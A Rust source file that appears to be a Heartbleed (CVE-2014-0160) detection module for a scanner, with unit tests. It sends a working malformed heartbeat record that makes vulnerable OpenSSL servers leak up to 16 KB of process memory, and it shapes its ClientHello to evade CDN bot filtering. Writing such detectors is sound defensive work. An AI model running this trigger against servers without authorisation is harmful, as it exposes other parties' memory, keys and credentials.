//! Heartbleed (CVE-2014-0160) probe.
//!
//! Exploits the fact that vulnerable OpenSSL processes heartbeat
//! records BEFORE completing the TLS handshake — no session key
//! derivation or encryption is required. Technique mirrors
//! `run_heartbleed()` in testssl.sh 3.2 and the Nmap `ssl-heartbleed`
//! NSE script.
//!
//! Flow:
//! 1. Open TCP to target.
//! 2. Send a raw TLS 1.2 ClientHello advertising the heartbeat extension
//!    (RFC 6520, extension type `0x000f`).
//! 3. Read the reply. If the server's ServerHello does not echo the
//!    heartbeat extension, report `Some(false)` — not vulnerable
//!    because the feature isn't negotiated at all.
//! 4. Otherwise send an 8-byte malformed heartbeat record: content
//!    type `0x18`, record length `3`, heartbeat type `request`,
//!    claimed payload length `0x4000` (16384 bytes), but no actual
//!    payload bytes. Vulnerable OpenSSL reads 16384 bytes of adjacent
//!    process memory and echoes it back.
//! 5. Read response. A reply starting with `0x18 0x03 0x??` plus
//!    substantial length (>16 bytes of leaked data) confirms the
//!    vulnerability.
//!
//! Returns:
//! - `Some(true)`  — vulnerable (oversized echo received)
//! - `Some(false)` — not vulnerable (no heartbeat extension, or no echo)
//! - `None`        — probe couldn't reach a state where it could decide
//!                   (TCP refused, ClientHello send failed, etc.)

use std::net::SocketAddr;
use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;
use tracing::debug;

/// TLS record content types.
const CT_HANDSHAKE: u8 = 0x16;
const CT_HEARTBEAT: u8 = 0x18;

/// Heartbeat extension type (RFC 6520).
const EXT_HEARTBEAT: u16 = 0x000f;
/// Server_name extension type (RFC 6066).
const EXT_SERVER_NAME: u16 = 0x0000;

pub async fn probe(target: SocketAddr, hostname: &str, connect_timeout: Duration) -> Option<bool> {
    let mut stream = match timeout(connect_timeout, TcpStream::connect(&target)).await {
        Ok(Ok(s)) => s,
        _ => {
            debug!("heartbleed: TCP connect failed or timed out");
            return None;
        }
    };

    let client_hello = build_client_hello(hostname);
    if stream.write_all(&client_hello).await.is_err() {
        debug!("heartbleed: ClientHello send failed");
        return None;
    }

    // Read enough bytes to see the ServerHello + its extensions.
    // 8 KiB is enough for any sane ServerHello + Certificate response
    // prefix; we only parse the first handshake record.
    let mut buf = vec![0u8; 8192];
    let n = match timeout(Duration::from_secs(5), stream.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => n,
        _ => {
            debug!("heartbleed: no ServerHello reply");
            return None;
        }
    };
    let server_reply = &buf[..n];

    match server_advertised_heartbeat(server_reply) {
        Some(true) => {}
        Some(false) => {
            debug!("heartbleed: server did not offer heartbeat extension");
            return Some(false);
        }
        None => {
            debug!("heartbleed: could not parse ServerHello extensions");
            return None;
        }
    }

    // Send the malformed heartbeat. Per testssl.sh: content type 0x18,
    // TLS 1.2, record length 3, type=request, claimed payload 0x4000.
    let heartbeat_req: [u8; 8] = [CT_HEARTBEAT, 0x03, 0x03, 0x00, 0x03, 0x01, 0x40, 0x00];
    if stream.write_all(&heartbeat_req).await.is_err() {
        debug!("heartbleed: heartbeat send failed");
        return None;
    }

    let mut reply = vec![0u8; 16384];
    let n = match timeout(Duration::from_secs(5), stream.read(&mut reply)).await {
        Ok(Ok(n)) => n,
        _ => {
            debug!("heartbleed: no heartbeat reply (likely patched)");
            return Some(false);
        }
    };
    Some(classify_heartbeat_reply(&reply[..n]))
}

/// Classify the raw bytes the server sent back after the malformed
/// heartbeat. Vulnerable: heartbeat record (`0x18`) with substantial
/// leaked payload. Any other shape = not vulnerable.
fn classify_heartbeat_reply(reply: &[u8]) -> bool {
    // Minimum valid TLS record header is 5 bytes. Anything less is a
    // torn connection — treat as not vulnerable.
    if reply.len() < 5 {
        return false;
    }
    // Must be a Heartbeat record with a plausible TLS version.
    if reply[0] != CT_HEARTBEAT || reply[1] != 0x03 {
        return false;
    }
    // Our request was 3 bytes of plaintext; a non-vulnerable server
    // will either not reply or echo a 3-byte record. A vulnerable one
    // echoes a much larger response (the leaked memory contents).
    // Threshold of 16 bytes matches testssl.sh's "more than 1 line of
    // 16 bytes" heuristic.
    let record_length = u16::from_be_bytes([reply[3], reply[4]]) as usize;
    record_length > 16
}

/// Parse a ServerHello's extensions (as bytes from the wire) looking
/// for the heartbeat extension echo.
///
/// Returns `Some(true)` when the heartbeat extension is present,
/// `Some(false)` when the ServerHello parsed but did not advertise it,
/// and `None` when the buffer can't be parsed as a TLS handshake
/// record + ServerHello.
fn server_advertised_heartbeat(buf: &[u8]) -> Option<bool> {
    // TLS record header: type(1) + version(2) + length(2).
    if buf.len() < 5 || buf[0] != CT_HANDSHAKE {
        return None;
    }
    let record_len = u16::from_be_bytes([buf[3], buf[4]]) as usize;
    let record_end = 5usize.saturating_add(record_len).min(buf.len());
    let record = buf.get(5..record_end)?;

    // Handshake header: type(1) + length(3). ServerHello == 0x02.
    if record.len() < 4 || record[0] != 0x02 {
        return None;
    }
    let hs_len = ((record[1] as usize) << 16) | ((record[2] as usize) << 8) | (record[3] as usize);
    let hs_end = 4usize.saturating_add(hs_len).min(record.len());
    let body = record.get(4..hs_end)?;

    // ServerHello body: version(2) + random(32) + session_id_len(1) +
    // session_id + cipher_suite(2) + compression(1) + extensions...
    let mut cursor = 0usize;
    let read_bytes = |body: &[u8], cursor: &mut usize, n: usize| -> Option<()> {
        if body.len() < *cursor + n {
            None
        } else {
            *cursor += n;
            Some(())
        }
    };
    read_bytes(body, &mut cursor, 2)?; // version
    read_bytes(body, &mut cursor, 32)?; // random
    let sid_len = *body.get(cursor)? as usize;
    cursor += 1;
    read_bytes(body, &mut cursor, sid_len)?; // session_id
    read_bytes(body, &mut cursor, 2)?; // cipher_suite
    read_bytes(body, &mut cursor, 1)?; // compression_method

    // Extensions block: length(2) + extensions.
    if body.len() < cursor + 2 {
        // No extensions block at all — legacy server; heartbeat not negotiated.
        return Some(false);
    }
    let ext_block_len = u16::from_be_bytes([body[cursor], body[cursor + 1]]) as usize;
    cursor += 2;
    let ext_end = cursor.saturating_add(ext_block_len).min(body.len());
    let mut i = cursor;
    while i + 4 <= ext_end {
        let ext_type = u16::from_be_bytes([body[i], body[i + 1]]);
        let ext_len = u16::from_be_bytes([body[i + 2], body[i + 3]]) as usize;
        if ext_type == EXT_HEARTBEAT {
            return Some(true);
        }
        i = i.saturating_add(4).saturating_add(ext_len);
    }
    Some(false)
}

/// Build a TLS 1.2 ClientHello that looks enough like a real browser
/// to survive CDN / edge-proxy TLS fingerprinting. Modern servers
/// (github.com in particular) drop "minimal" hellos as bot traffic.
///
/// Advertises:
/// - A common ECDHE + RSA-kex cipher-suite list.
/// - SNI, supported_groups, ec_point_formats, signature_algorithms,
///   supported_versions (pinned to TLS 1.2 so the server doesn't pick
///   TLS 1.3, which has no heartbeat support), and the heartbeat
///   extension (mode = peer_allowed_to_send).
fn build_client_hello(hostname: &str) -> Vec<u8> {
    let mut exts: Vec<u8> = Vec::new();

    // SNI extension.
    let host = hostname.as_bytes();
    let mut sni_body = Vec::with_capacity(host.len() + 5);
    let sni_list_len = (host.len() + 3) as u16;
    sni_body.extend_from_slice(&sni_list_len.to_be_bytes());
    sni_body.push(0x00); // name_type = host_name
    sni_body.extend_from_slice(&(host.len() as u16).to_be_bytes());
    sni_body.extend_from_slice(host);
    exts.extend_from_slice(&EXT_SERVER_NAME.to_be_bytes());
    exts.extend_from_slice(&(sni_body.len() as u16).to_be_bytes());
    exts.extend_from_slice(&sni_body);

    // supported_groups (ext 10): X25519, secp256r1, secp384r1.
    let groups: [u8; 8] = [0x00, 0x06, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x18];
    exts.extend_from_slice(&0x000au16.to_be_bytes());
    exts.extend_from_slice(&(groups.len() as u16).to_be_bytes());
    exts.extend_from_slice(&groups);

    // ec_point_formats (ext 11): uncompressed only.
    exts.extend_from_slice(&0x000bu16.to_be_bytes());
    exts.extend_from_slice(&2u16.to_be_bytes());
    exts.push(0x01);
    exts.push(0x00);

    // signature_algorithms (ext 13): a reasonable set of rsa/ecdsa
    // sigalgs with SHA-256/384/512.
    let sigalgs: [u8; 20] = [
        0x00, 0x12, // list length
        0x04, 0x03, // ecdsa_secp256r1_sha256
        0x08, 0x04, // rsa_pss_rsae_sha256
        0x04, 0x01, // rsa_pkcs1_sha256
        0x05, 0x03, // ecdsa_secp384r1_sha384
        0x08, 0x05, // rsa_pss_rsae_sha384
        0x05, 0x01, // rsa_pkcs1_sha384
        0x08, 0x06, // rsa_pss_rsae_sha512
        0x06, 0x01, // rsa_pkcs1_sha512
        0x02, 0x01, // rsa_pkcs1_sha1
    ];
    exts.extend_from_slice(&0x000du16.to_be_bytes());
    exts.extend_from_slice(&(sigalgs.len() as u16).to_be_bytes());
    exts.extend_from_slice(&sigalgs);

    // supported_versions (ext 43): pin to TLS 1.2 so the server picks
    // a version where heartbeat is actually defined.
    let sv: [u8; 3] = [0x02, 0x03, 0x03];
    exts.extend_from_slice(&0x002bu16.to_be_bytes());
    exts.extend_from_slice(&(sv.len() as u16).to_be_bytes());
    exts.extend_from_slice(&sv);

    // Heartbeat extension. Body is a single byte: mode 1 = peer allowed.
    exts.extend_from_slice(&EXT_HEARTBEAT.to_be_bytes());
    exts.extend_from_slice(&1u16.to_be_bytes());
    exts.push(0x01);

    let cipher_suites: [u8; 14] = [
        0xc0, 0x2b, // TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
        0xc0, 0x2f, // TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
        0xc0, 0x2c, // TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
        0xc0, 0x30, // TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
        0x00, 0x2f, // TLS_RSA_WITH_AES_128_CBC_SHA
        0x00, 0x35, // TLS_RSA_WITH_AES_256_CBC_SHA
        0x00, 0x0a, // TLS_RSA_WITH_3DES_EDE_CBC_SHA
    ];

    // ClientHello body.
    let mut hello = Vec::new();
    hello.extend_from_slice(&[0x03, 0x03]); // client_version = TLS 1.2
    hello.extend_from_slice(&[
        // 32 bytes of deterministic "random" — the probe doesn't care
        // about Finished verification, so any fixed bytes work.
        0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
        0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
        0xaa, 0xaa,
    ]);
    hello.push(0x00); // session_id length = 0
    hello.extend_from_slice(&(cipher_suites.len() as u16).to_be_bytes());
    hello.extend_from_slice(&cipher_suites);
    hello.push(0x01); // compression_methods length
    hello.push(0x00); // null compression
    hello.extend_from_slice(&(exts.len() as u16).to_be_bytes());
    hello.extend_from_slice(&exts);

    // Handshake header.
    let mut handshake = Vec::with_capacity(hello.len() + 4);
    handshake.push(0x01); // handshake_type = ClientHello
    let len = hello.len();
    handshake.push((len >> 16) as u8);
    handshake.push((len >> 8) as u8);
    handshake.push(len as u8);
    handshake.extend_from_slice(&hello);

    // TLS record header.
    let mut record = Vec::with_capacity(handshake.len() + 5);
    record.push(CT_HANDSHAKE);
    record.extend_from_slice(&[0x03, 0x03]);
    record.extend_from_slice(&(handshake.len() as u16).to_be_bytes());
    record.extend_from_slice(&handshake);

    record
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classify_rejects_short_replies() {
        assert!(!classify_heartbeat_reply(&[]));
        assert!(!classify_heartbeat_reply(&[0x18]));
        assert!(!classify_heartbeat_reply(&[0x18, 0x03, 0x03, 0x00]));
    }

    #[test]
    fn classify_rejects_non_heartbeat_content_type() {
        // 0x15 is an Alert record; 0x16 is handshake. Either way,
        // not a heartbeat echo.
        let alert = [0x15, 0x03, 0x03, 0x00, 0x02, 0x02, 0x28];
        assert!(!classify_heartbeat_reply(&alert));
    }

    #[test]
    fn classify_rejects_small_heartbeat_echo() {
        // Non-vulnerable server echoes a proper 3-byte heartbeat reply
        // (our request size). Record length = 3 → not vulnerable.
        let echo = [
            0x18, 0x03, 0x03, 0x00, 0x03, // header, length = 3
            0x02, 0x40, 0x00, // type = response, size = 0
        ];
        assert!(!classify_heartbeat_reply(&echo));
    }

    #[test]
    fn classify_accepts_oversized_heartbeat_echo() {
        // Vulnerable server leaks 32 bytes of memory. Record length = 32.
        let mut leaked = vec![0x18, 0x03, 0x03, 0x00, 0x20];
        leaked.extend_from_slice(&[0xde; 32]);
        assert!(classify_heartbeat_reply(&leaked));
    }

    #[test]
    fn build_client_hello_has_heartbeat_extension_tag() {
        let hello = build_client_hello("example.test");
        // The extension type bytes 0x00 0x0f must appear somewhere in
        // the record — either in our extensions block or nowhere.
        assert!(
            hello.windows(2).any(|w| w == [0x00, 0x0f]),
            "heartbeat extension tag missing"
        );
    }
}
